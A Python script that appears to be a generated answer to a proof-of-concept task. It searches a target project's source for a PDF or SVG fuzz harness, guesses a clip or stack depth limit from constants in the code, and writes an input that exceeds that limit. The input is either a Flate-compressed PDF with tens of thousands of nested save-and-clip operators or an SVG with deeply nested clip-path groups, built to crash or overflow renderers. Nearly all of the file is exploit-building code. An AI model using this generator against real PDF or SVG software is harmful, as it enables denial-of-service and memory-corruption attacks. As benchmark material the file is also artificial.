import os
import re
import tarfile
import zlib
from collections import Counter, defaultdict
from typing import Dict, Iterable, List, Optional, Tuple


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
    ".rs", ".go", ".java", ".kt", ".m", ".mm", ".swift",
    ".py", ".js", ".ts",
    ".txt", ".md", ".rst", ".yaml", ".yml", ".toml", ".json", ".xml",
    ".cmake", ".gn", ".gni", ".bazel", ".bzl", ".mk", ".in",
    ".sh", ".bat", ".ps1",
}
_MAX_TEXT_FILE = 3_000_000


def _safe_decode(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _iter_tar_text_files(src_path: str) -> Iterable[Tuple[str, str]]:
    try:
        if not tarfile.is_tarfile(src_path):
            return
    except Exception:
        return
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > _MAX_TEXT_FILE:
                    continue
                name = m.name
                _, ext = os.path.splitext(name.lower())
                if ext not in _TEXT_EXTS and os.path.basename(name) not in ("cmakelists.txt", "makefile"):
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                yield name, _safe_decode(data)
    except Exception:
        return


def _iter_dir_text_files(src_dir: str) -> Iterable[Tuple[str, str]]:
    for root, _, files in os.walk(src_dir):
        for fn in files:
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > _MAX_TEXT_FILE:
                continue
            name = os.path.relpath(path, src_dir)
            _, ext = os.path.splitext(fn.lower())
            if ext not in _TEXT_EXTS and fn.lower() not in ("cmakelists.txt", "makefile"):
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            yield name, _safe_decode(data)


def _iter_all_text_files(src_path: str) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_dir_text_files(src_path)
        return
    if tarfile.is_tarfile(src_path):
        yield from _iter_tar_text_files(src_path)
        return
    # Fallback: try to treat as directory path without checking
    if os.path.exists(src_path):
        yield from _iter_dir_text_files(src_path)


def _find_best_fuzzer(files: List[Tuple[str, str]]) -> Optional[Tuple[str, str]]:
    best = None
    best_score = -1
    for name, txt in files:
        if "LLVMFuzzerTestOneInput" not in txt:
            continue
        score = 0
        tl = txt.lower()
        if "pdf" in tl:
            score += 2
        if "%pdf" in tl or "loadmemdocument" in tl or "fz_open_document" in tl or "fpdf_" in txt:
            score += 10
        if "svg" in tl:
            score += 2
        if "<svg" in tl or "librsvg" in tl or "rsvg_" in tl or "resvg" in tl or "usvg" in tl:
            score += 10
        if "clip" in tl:
            score += 1
        if "stack" in tl or "nest" in tl or "depth" in tl:
            score += 1
        if score > best_score:
            best = (name, txt)
            best_score = score
    return best


def _detect_format_and_depth(src_path: str) -> Dict[str, object]:
    files = list(_iter_all_text_files(src_path))

    fuzzer = _find_best_fuzzer(files)
    fuzzer_txt = fuzzer[1] if fuzzer else ""

    pdf_score = 0
    svg_score = 0

    def add_scores(text: str, path: str) -> None:
        nonlocal pdf_score, svg_score
        tl = text.lower()
        pl = path.lower()
        # PDF strong signals
        if "%pdf" in tl:
            pdf_score += 50
        if "fuzz" in pl and ".pdf" in tl:
            pdf_score += 8
        if "fuzz" in pl and "%pdf" in tl:
            pdf_score += 15
        if "f" in tl and "fpdf_" in text:
            pdf_score += 40
        if "mupdf" in tl or "fz_document" in tl or "fz_open_document" in tl:
            pdf_score += 40
        if "poppler" in tl:
            pdf_score += 30
        if "qpdf" in tl:
            pdf_score += 15
        if "flate" in tl and "pdf" in tl:
            pdf_score += 5
        if "pdf" in tl:
            pdf_score += 1

        # SVG strong signals
        if "<svg" in tl:
            svg_score += 50
        if "librsvg" in tl or "rsvg_" in tl:
            svg_score += 40
        if "resvg" in tl or "usvg" in tl:
            svg_score += 40
        if "clip-path" in tl:
            svg_score += 5
        if "svg" in tl:
            svg_score += 1

        # Path hints
        if "/pdf" in pl or pl.endswith(".pdf") or pl.endswith("_pdf.cc") or "pdfium" in pl:
            pdf_score += 5
        if "/svg" in pl or pl.endswith(".svg") or "librsvg" in pl or "resvg" in pl:
            svg_score += 5

    # Score from fuzzer file heavily
    if fuzzer_txt:
        add_scores(fuzzer_txt, "FUZZER")

    # Score from all files lightly, but keep it bounded
    for name, txt in files[:2000]:
        add_scores(txt, name)

    # Detect whether full PDF is needed
    expects_full_pdf = False
    tl = fuzzer_txt.lower()
    if "%pdf" in tl or "loadmemdocument" in tl or "fz_open_document" in tl or "load_document" in tl or "document" in tl:
        if "pdf" in tl:
            expects_full_pdf = True

    # Seed extension hints
    ext_counts = Counter()
    # If tar file, scan filenames via tar listing (cheaper than extracting)
    if not os.path.isdir(src_path) and tarfile.is_tarfile(src_path):
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    fn = m.name.lower()
                    _, ext = os.path.splitext(fn)
                    if ext in (".pdf", ".svg", ".skp", ".json", ".xml", ".txt"):
                        if "corpus" in fn or "seed" in fn or "test" in fn or "fuzz" in fn:
                            ext_counts[ext] += 1
        except Exception:
            pass
    else:
        for root, _, files2 in os.walk(src_path):
            for fn in files2:
                fnl = fn.lower()
                _, ext = os.path.splitext(fnl)
                if ext in (".pdf", ".svg", ".skp", ".json", ".xml", ".txt"):
                    rel = os.path.relpath(os.path.join(root, fn), src_path).lower()
                    if "corpus" in rel or "seed" in rel or "test" in rel or "fuzz" in rel:
                        ext_counts[ext] += 1

    if ext_counts.get(".pdf", 0) > 0:
        pdf_score += 30
        expects_full_pdf = True
    if ext_counts.get(".svg", 0) > 0:
        svg_score += 30

    # Try extract stack/depth constant candidates from relevant lines
    terms = ("nest", "depth", "stack", "clip", "layer", "mark")
    num_weights: Dict[int, int] = defaultdict(int)

    def consider_line(line: str, base_w: int) -> None:
        ll = line.lower()
        if not any(t in ll for t in terms):
            return
        w = base_w
        if "stack" in ll:
            w += 5
        if "depth" in ll or "nest" in ll:
            w += 5
        if "clip" in ll:
            w += 6
        if "layer" in ll:
            w += 3
        if "mark" in ll:
            w += 3
        if "max" in ll or "kmax" in ll:
            w += 4
        if w <= 0:
            return
        for s in re.findall(r"\b\d{2,6}\b", line):
            try:
                n = int(s)
            except Exception:
                continue
            if 32 <= n <= 200000:
                num_weights[n] += w

    for name, txt in files:
        base = 0
        nl = name.lower()
        if "clip" in nl or "layer" in nl:
            base += 2
        if "render" in nl or "canvas" in nl or "pdf" in nl or "svg" in nl:
            base += 1
        if "fuzz" in nl:
            base += 1
        if base == 0:
            # still consider some lines if they are highly indicative
            pass
        # Only scan up to a limit of lines to keep runtime bounded
        lines = txt.splitlines()
        if len(lines) > 20000:
            lines = lines[:20000]
        for line in lines:
            if ("clip" in line.lower() and ("stack" in line.lower() or "depth" in line.lower() or "nest" in line.lower())) or ("clip mark" in line.lower()):
                consider_line(line, base_w=base + 3)
            else:
                # lightly consider if other terms appear
                consider_line(line, base_w=base)

    best_depth = None
    if num_weights:
        # Choose the best weighted number; if tie, choose the smaller (more likely a limit)
        best_depth = sorted(num_weights.items(), key=lambda kv: (-kv[1], kv[0]))[0][0]

    fmt = "pdf" if pdf_score >= svg_score else "svg"

    return {
        "format": fmt,
        "expects_full_pdf": expects_full_pdf,
        "depth_limit": best_depth,
        "pdf_score": pdf_score,
        "svg_score": svg_score,
        "seed_ext_counts": dict(ext_counts),
    }


def _build_pdf_with_stream(stream_data: bytes, flate: bool = True) -> bytes:
    if flate:
        compressed = zlib.compress(stream_data, 9)
        stream_dict = f"<< /Length {len(compressed)} /Filter /FlateDecode >>".encode("ascii")
        stream_bytes = compressed
    else:
        stream_dict = f"<< /Length {len(stream_data)} >>".encode("ascii")
        stream_bytes = stream_data

    # Objects
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Contents 4 0 R >>\nendobj\n"
    obj4 = b"4 0 obj\n" + stream_dict + b"\nstream\n" + stream_bytes + b"\nendstream\nendobj\n"

    parts = [header, obj1, obj2, obj3, obj4]
    offsets = [0]
    cur = 0
    for p in parts:
        offsets.append(cur)
        cur += len(p)

    # offsets list currently includes header offset too; need object offsets for 1..4
    # Object 1 starts after header; object 2 after obj1; etc.
    obj_offsets = [
        0,  # obj 0
        len(header),
        len(header) + len(obj1),
        len(header) + len(obj1) + len(obj2),
        len(header) + len(obj1) + len(obj2) + len(obj3),
    ]
    xref_pos = sum(len(p) for p in parts)

    xref = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
    for off in obj_offsets[1:]:
        xref.append(f"{off:010d} 00000 n \n".encode("ascii"))
    xref_bytes = b"".join(xref)

    trailer = (
        b"trailer\n"
        b"<< /Size 5 /Root 1 0 R >>\n"
        b"startxref\n" + str(xref_pos).encode("ascii") + b"\n"
        b"%%EOF\n"
    )
    return b"".join(parts) + xref_bytes + trailer


def _make_pdf_content(depth: int) -> bytes:
    # Robust pattern: each iteration increases nesting (q) and performs a clip (W n),
    # then finally restores to keep state bounded.
    # Use minimal tokenization.
    # "q 0 0 1 1 re W n " is 17 bytes.
    # "Q " is 2 bytes.
    if depth < 1:
        depth = 1
    iter_pat = b"q 0 0 1 1 re W n "
    restore = b"Q "
    return (iter_pat * depth) + (restore * depth)


def _make_svg(depth: int) -> bytes:
    if depth < 1:
        depth = 1
    prefix = (
        b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
        b'<defs><clipPath id="c"><rect width="1" height="1"/></clipPath></defs>'
    )
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b"</g>"
    body = (open_tag * depth) + b'<rect width="1" height="1"/>' + (close_tag * depth)
    suffix = b"</svg>"
    return prefix + body + suffix


class Solution:
    def solve(self, src_path: str) -> bytes:
        info = _detect_format_and_depth(src_path)
        fmt = info.get("format", "pdf")
        depth_limit = info.get("depth_limit", None)

        if fmt == "svg":
            # Keep size manageable if we couldn't infer a limit
            if isinstance(depth_limit, int):
                depth = max(depth_limit + 32, 2048)
            else:
                depth = 40000
            # Cap to avoid extreme memory/time
            depth = min(depth, 120000)
            return _make_svg(depth)

        # PDF path
        expects_full_pdf = bool(info.get("expects_full_pdf", True))
        if isinstance(depth_limit, int):
            depth = max(depth_limit + 32, 4096)
        else:
            depth = 60000

        depth = min(depth, 200000)

        content = _make_pdf_content(depth)

        if expects_full_pdf:
            # Use Flate compression for a shorter PoC input.
            return _build_pdf_with_stream(content, flate=True)

        # If the harness expects only a content stream, return raw content.
        return content